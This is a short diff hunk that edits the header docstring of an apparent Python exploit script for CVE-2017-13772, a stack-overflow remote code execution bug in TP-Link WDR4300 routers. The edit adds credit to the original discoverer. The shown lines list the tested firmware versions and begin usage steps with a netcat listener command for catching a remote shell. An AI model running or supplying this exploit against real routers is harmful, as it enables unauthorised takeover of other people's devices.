@@ -10,7 +10,11 @@ import socket
 
 """
 RCE via stack-based overflow on TP-Link WDR4300 (N750) devices, using CVE-2017-13772.
-Tested on Firmware versions 3.13.33, Build 130618 and 3.14.3 Build 150518, hardware WDR4300 v1
+
+This was initially discovered on TP-Link WR940N by Tim Carrington, @__invictus_ 
+https://fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/
+
+Tested on Firmware versions 3.13.33, Build 130618 and 3.14.3 Build 150518, hardware WDR4300 v1.
 
 Usage:
 1) Start listener on attacker machine: nc -nlvvp 31337
